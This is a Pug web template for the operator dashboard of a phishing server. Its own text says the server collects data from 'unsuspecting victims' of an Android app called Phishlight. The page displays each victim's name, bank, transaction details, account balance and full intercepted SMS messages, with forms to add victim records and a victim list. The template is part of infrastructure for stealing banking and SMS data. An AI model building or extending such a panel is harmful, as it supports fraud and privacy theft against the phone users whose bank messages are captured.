extends layout

block content
	h1= title
	p(style ='white-space:pre') 
		| This server collects malicious data from unsuspecting 
		| victims who are using the Phishlight Android application.
		| 

	// Wrapper
	#wrapper

		// USER INFO
		#userInfo
			h2 User Info
			p
				strong Name:
				|  <span id='userInfoName'></span>
				br
				strong Bank:
				|  <span id='bankName'></span>
				br
				strong Transaction time:
				|  <span id='transTime'></span>
				br
				strong Transaction date:
				|  <span id='transDate'></span>
				br
				strong Transaction Place: 
				| <span id='transPlace'></span>
				br
				strong Transaction type: 
				| <span id='transType'></span>
				br
				strong Transaction amount: 
				| <span id='transAmount'></span>
				br
				strong Account Balance: 
				| <span id='accBalance'></span>
				br
				strong SMS ID: 
				| <span id='smsID'></span>
				br
				strong SMS time: 
				| <span id='smsTime'></span>
				br
				strong SMS number: 
				| <span id='smsNum'></span>
				br
				strong Whole message: 
				| <span id='smsContent'></span>
				
		// /USER INFO


		// ADD DATA
		h2 Add Data
		#addUser
			fieldset
				input#inputUserFullName(type='text', placeholder='Full Name')
				input#inputBankName(type='text', placeholder='Bank name')
				br
				input#inputTransTime(type='text', placeholder='Transfer time')
				input#inputTransDate(type='text', placeholder='Transfer date')
				br
				input#inputTransPlace(type='text', placeholder='Transfer place')
				input#inputTransType(type='text', placeholder='Transfer type')
				br
				input#inputTransAmount(type='text', placeholder='Transfer amount')
				input#inputAccBalance(type='text', placeholder='Account Balance')
				br
				input#inputSmsID(type='text', placeholder='SMS ID')
				input#inputSmsTime(type='text', placeholder='SMS time')
				br
				input#inputSmsNum(type='text', placeholder='SMSNumber')
				input#inputSmsContent(type='text', placeholder='TextContent')
				br
				button#btnAddUser Add User Data
		// /ADD USER

		br

		// USER LIST
		h2 User List
		#userList
			table
				thead
					th Name of victim
					th Bank Name
					th Delete?
				tbody
		// /USER LIST

	// /Wrapper

	p(style='white-space:pre')
